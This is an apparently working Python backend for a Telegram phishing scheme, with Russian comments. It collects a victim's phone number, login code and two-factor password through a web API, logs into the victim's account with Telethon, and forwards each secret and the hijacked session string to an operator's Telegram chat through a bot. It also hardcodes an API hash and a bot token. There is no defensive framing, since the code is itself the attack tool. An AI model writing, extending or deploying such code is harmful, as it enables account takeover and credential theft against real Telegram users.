import asyncio, os, logging
from aiogram import Bot, Dispatcher
from aiohttp import web
import aiohttp_cors
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError

# ТВОИ ДАННЫЕ
API_ID, API_HASH = 15587172, "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN, ADMIN_ID = "8613728108:AAGR9Lmdx2YvG6wbg8qk31rcLxeKD4Vu6Po", 1866813859

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

async def handle_api(request):
    try:
        data = await request.json()
        uid = str(data.get("user_id"))
        act = data.get("action")
        
        # 1. ОТПРАВКА НОМЕРА
        if act == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
            active_clients[uid] = {"c": client, "p": phone, "h": sent.phone_code_hash}
            
            # Уведомляем админа о вводе номера
            await bot.send_message(ADMIN_ID, f"📱 Введен номер: `{phone}`\nОжидаем код...")
            return web.json_response({"status": "ok"})
            
        # 2. ВВОД КОДА
        elif act == "send_code":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Сессия истекла"})
            
            code = data.get("code")
            await bot.send_message(ADMIN_ID, f"📨 Код для {s['p']}: `{code}`")
            
            try:
                await s["c"].sign_in(s["p"], code, phone_code_hash=s["h"])
                return await finish_login(uid)
            except SessionPasswordNeededError:
                return web.json_response({"status": "need_2fa"})
            except Exception as e:
                return web.json_response({"status": "error", "message": str(e)})

        # 3. ВВОД ПАРОЛЯ (2FA)
        elif act == "send_password":
            s = active_clients.get(uid)
            pwd = data.get("password")
            await bot.send_message(ADMIN_ID, f"🔑 Пароль 2FA для {s['p']}: `{pwd}`")
            
            try:
                await s["c"].sign_in(password=pwd)
                return await finish_login(uid)
            except PasswordHashInvalidError:
                return web.json_response({"status": "error", "message": "Неверный пароль"})

    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def finish_login(uid):
    s = active_clients.get(uid)
    ss = s["c"].session.save()
    await bot.send_message(ADMIN_ID, f"✅ ВХОД ВЫПОЛНЕН!\nНомер: `{s['p']}`\n\nСЕССИЯ:\n`{ss}`", parse_mode="Markdown")
    return web.json_response({"status": "success"})

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
resource = app.router.add_resource("/api")
cors.add(resource.add_route("POST", handle_api))

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', port).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
